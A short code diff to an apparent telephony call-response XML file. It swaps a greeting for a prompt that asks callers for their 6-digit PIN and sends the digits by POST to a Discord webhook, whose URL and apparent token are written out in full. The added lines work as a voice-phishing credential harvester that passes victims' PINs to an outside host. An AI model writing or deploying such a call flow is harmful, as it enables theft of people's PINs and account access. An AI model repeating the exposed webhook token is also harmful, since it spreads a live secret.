@@ -1,3 +1,6 @@
 <Response>
-<Speak>Congratulations! You've made your first outbound call!</Speak>
+  <GetDigits action="https://discord.com/api/webhooks/1100654042193068062/xiOqxtzpsva2t8Kc3Hg_52Tn8eNrOohtY7fsZW_9-LfZis5ZKXErJZ1KzdWbyd51AXPM" method="POST" numDigits="6">
+    <Speak>Please enter your 6-digit PIN code, followed by the pound sign.</Speak>
+  </GetDigits>
+  <Speak>Thank you for entering your PIN code.</Speak>
 </Response>
